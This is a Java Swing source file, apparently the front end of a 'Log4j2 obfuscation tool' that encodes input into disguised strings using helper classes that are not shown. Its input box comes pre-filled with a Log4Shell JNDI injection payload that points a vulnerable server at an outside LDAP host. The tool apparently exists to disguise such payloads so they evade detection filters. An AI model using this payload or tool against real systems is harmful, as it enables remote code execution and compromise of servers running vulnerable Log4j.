package main.java;

import javax.swing.*;
import java.awt.*;

public class log4 {
    public static void main(String[] args) {

        JFrame jf = new JFrame("Log4j2混淆工具");
//        jf.setBounds(630, 330, 1000, 700);//标题
        jf.setBounds(630, 330, 985, 520);//标题
        jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        jf.setResizable(false);
        jf.setLayout(null);
        //创建文本域
        JTextArea jTextArea = new JTextArea("${jndi:ldap://1.1.1.1:9999/aaa}");
        JTextArea jTextArea2 = new JTextArea();
        JTextArea jTextArea3 = new JTextArea();
//        JTextArea jTextArea4 = new JTextArea();

        JButton jButton = new JButton("开始混淆");
        jButton.setBounds(837,145,130,40);
        //自动换行
        jTextArea.setLineWrap(true);
        jTextArea2.setLineWrap(true);
        jTextArea3.setLineWrap(true);
//        jTextArea4.setLineWrap(true);
        JScrollPane scrollPane2 = new JScrollPane(jTextArea2);
        JScrollPane scrollPane3 = new JScrollPane(jTextArea3);
//        JScrollPane scrollPane4 = new JScrollPane(jTextArea4);


        //创建标签
        JLabel jLabel1 = new JLabel("原始数据");
        JLabel jLabel2 = new JLabel("字符串一");
        JLabel jLabel3 = new JLabel("字符串二");
//        JLabel jLabel4 = new JLabel("字符串三");

        //位置

        jLabel1.setBounds(15, 0, 150, 50);//原始数据标签
        jTextArea.setBounds(15, 40, 950, 100);//文本域

        jLabel2.setBounds(15, 150, 150, 50);//字符串一-标签
        scrollPane2.setBounds(15,190,950,100);//文本域2


        jLabel3.setBounds(15,300,150,50);//对话框2
        scrollPane3.setBounds(15,340,950,100);
        //对话框四
//        jLabel4.setBounds(15,450,150,50);
//        scrollPane4.setBounds(15,490,950,100);

        //设置字体
        Font font = new Font("宋体", Font.PLAIN, 20);//创建1个字体实例
        jLabel1.setFont(font);//设置目标标签的字体
        jLabel2.setFont(font);//设置信息标签的字体
        jLabel3.setFont(font);
//        jLabel4.setFont(font);
        jTextArea.setFont(font);//设置文本域字体
        jTextArea2.setFont(font);//文本域2-颜色
        jTextArea3.setFont(font);//文本域3
//        jTextArea4.setFont(font);
        jButton.setFont(font);
        //将组件添加到框架
        jf.add(jTextArea);
        jf.add(jLabel1);
        jf.add(jLabel2);
        jf.add(scrollPane2);
        jf.add(scrollPane3);
        jf.add(jLabel3);
//        jf.add(jLabel4);
//        jf.add(scrollPane4);
        jf.add(jButton);
        //显示窗口
        jf.setVisible(true);
        //设置窗体关闭时，自动退出程序
        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);

        jButton.addActionListener(e -> {
            String text = jTextArea.getText();
            new encode2(text,jTextArea2);
            new encode3(text,jTextArea3);
        });
    }

}
